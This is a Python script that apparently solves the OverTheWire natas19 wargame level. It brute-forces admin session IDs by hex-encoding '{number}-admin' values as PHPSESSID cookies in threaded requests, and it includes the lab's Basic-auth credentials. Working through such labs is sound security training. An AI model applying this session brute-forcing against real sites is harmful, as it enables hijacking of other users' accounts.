
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from itertools import chain
import base64

def string_to_hex(s):
    return ''.join(format(ord(char), '02x') for char in s)


URL = "http://natas19.natas.labs.overthewire.org"

username = "natas19"
password = "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr"
cookies = {'PHPSESSID':''}
headers = {"authorization":'Basic {0}'.format(base64.b64encode(f"{username}:{password}".encode()).decode())}


def check_session(i):
    payload = f"{i}-admin"
    cookies['PHPSESSID']  = bytes.hex(payload.encode())
    
    response = requests.get(URL,headers=headers, cookies=cookies)

    if "You are an admin" in response.text:
        print(response.text)
        return True
    return False


def main():
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = []
        for i in range(1000):
                futures.append(executor.submit(check_session, i))
        
        for future in as_completed(futures):
            if future.result():
                # If an admin session is found, shut down all other threads
                executor.shutdown(wait=False)
                break

if __name__ == "__main__":
    main()
